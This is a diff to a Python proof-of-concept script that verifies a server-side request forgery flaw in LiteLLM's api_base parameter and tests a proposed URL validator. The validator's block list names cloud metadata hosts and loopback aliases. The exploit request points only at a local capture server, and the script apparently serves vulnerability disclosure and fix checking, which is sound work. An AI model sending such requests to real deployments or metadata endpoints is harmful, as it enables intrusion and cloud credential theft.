@@ -5,9 +5,9 @@ verify_litellm_ssrf.py
 Verifies SSRF via unvalidated api_base parameter in LiteLLM
 
 How it works:
-  1. Starts a local capture server on port 18877 (simulates metadata endpoint)
-  2. Sends requests to LiteLLM proxy with malicious api_base
-  3. Confirms requests are forwarded without IP range validation
+  1. Starts a local capture server on port 18877
+  2. Sends LiteLLM a request with api_base pointing to the capture server
+  3. If LiteLLM forwards the request — SSRF confirmed (captured by local server)
   4. Demonstrates what a fixed validator would block (Step 3 runs standalone)
 
 Requirements:
@@ -67,7 +67,7 @@ def bold(s):   return f"{BOLD}{s}{RESET}"
 BANNER = f"""
 {bold(cyan('╔══════════════════════════════════════════════════════════════╗'))}
 {bold(cyan('║  LiteLLM SSRF Verifier — api_base Unvalidated URL Forwarding ║'))}
-{bold(cyan('║  CVE: TBD  |  CVSS: 8.2 High  |  CWE-918                    ║'))}
+{bold(cyan('║  CVE: TBD  |  CVSS: 7.7 High  |  CWE-918                    ║'))}
 {bold(cyan('║  Affected: litellm/litellm (all versions with proxy)        ║'))}
 {bold(cyan('╚══════════════════════════════════════════════════════════════╝'))}
 """
@@ -119,6 +119,9 @@ TEST_URLS = [
     ("Legitimate HTTPS URL",    "https://api.openai.com/"),
 ]
 
+# URL that actually hits the local capture server — proves LiteLLM forwards without filtering
+CAPTURE_URL = f"http://127.0.0.1:{CAPTURE_PORT}/chat/completions"
+
 # ---------------------------------------------------------------------------
 # SSRF prevention validator (proposed fix)
 # ---------------------------------------------------------------------------
@@ -138,8 +141,11 @@ def is_safe_url(url: str) -> Optional[str]:
 
     hostname = parsed.hostname or ""
 
-    # Block known cloud metadata hostnames
-    blocked_hosts = {"169.254.169.254", "metadata.google.internal", "metadata.internal", "169.254.169.253"}
+    # Block known dangerous hostnames (cloud metadata + loopback aliases)
+    blocked_hosts = {
+        "169.254.169.254", "metadata.google.internal", "metadata.internal",
+        "169.254.169.253", "localhost", "ip6-localhost", "ip6-loopback",
+    }
     if hostname.lower() in blocked_hosts:
         return "URL targets a restricted metadata host"
 
@@ -180,53 +186,53 @@ def step1_sanity(endpoint: str) -> bool:
         return False
 
 def step2_exploit(endpoint: str) -> bool:
-    print(f"\n{bold('[STEP 2] Confirm SSRF — verify api_base forwarded without filtering')}")
-    print(f"  Capture server at http://127.0.0.1:{CAPTURE_PORT}")
+    print(f"\n{bold('[STEP 2] Confirm SSRF — send api_base pointing to local capture server')}")
+    print(f"  Capture server at {CAPTURE_URL}")
     print()
 
-    all_vulnerable = True
-    for name, url in TEST_URLS:
-        # Empty queue for this test
-        while not captured.empty():
-            try:
-                captured.get_nowait()
-            except queue.Empty:
-                break
-
+    # Drain queue
+    while not captured.empty():
         try:
-            resp = requests.post(
-                endpoint,
-                json={
-                    "model": "gpt-3.5-turbo",
-                    "messages": [{"role": "user", "content": "test"}],
-                    "api_base": url,
-                },
-                headers={"Authorization": "Bearer sk-dummy"},
-                timeout=2,
-            )
-        except Exception as e:
-            # Network error expected if api_base is invalid
-            pass
+            captured.get_nowait()
+        except queue.Empty:
+            break
 
-        time.sleep(0.1)
-        captured_items = []
-        while not captured.empty():
-            try:
-                captured_items.append(captured.get_nowait())
-            except queue.Empty:
-                break
+    try:
+        requests.post(
+            endpoint,
+            json={
+                "model": "gpt-3.5-turbo",
+                "messages": [{"role": "user", "content": "test"}],
+                "api_base": CAPTURE_URL,
+            },
+            headers={"Authorization": "Bearer sk-dummy"},
+            timeout=3,
+        )
+    except Exception:
+        pass
 
-        if url == "https://api.openai.com/":
-            print(green(f"  [+] PASS (legit): {name}"))
-        else:
-            if captured_items:
-                print(red(f"  [VULN] {name}"))
-                print(red(f"      → forwarded without blocking: {url}"))
-            else:
-                print(yellow(f"  [?] {name} — not captured (may be blocked or network error)"))
-                all_vulnerable = False
+    time.sleep(0.3)
+    items = []
+    while not captured.empty():
+        try:
+            items.append(captured.get_nowait())
+        except queue.Empty:
+            break
 
-    return all_vulnerable
+    if items:
+        print(red(f"  [VULN] LiteLLM forwarded request to capture server without filtering"))
+        print(red(f"      → api_base: {CAPTURE_URL}"))
+        print(red(f"      → captured: {items[0].get('method')} {items[0].get('path')}"))
+        print()
+        print(f"  Additional dangerous targets (not directly capturable):")
+        for name, url in TEST_URLS:
+            if url != "https://api.openai.com/":
+                print(red(f"      • {name}: {url}"))
+        return True
+    else:
+        print(yellow(f"  [?] Capture server received no requests — SSRF not confirmed"))
+        print(yellow(f"      (LiteLLM may have blocked it, or proxy not running correctly)"))
+        return False
 
 def step3_fix():
     print(f"\n{bold('[STEP 3] Verify fix — proposed validator blocks dangerous URLs')}")
@@ -298,7 +304,10 @@ def main():
 
         print(f"{bold('='*64)}\n")
 
-        sys.exit(0 if vuln_confirmed else 1)
+        if vuln_confirmed:
+            sys.exit(0)
+        else:
+            sys.exit(2)
 
     except KeyboardInterrupt:
         print(yellow("\n[!] Interrupted by user"))
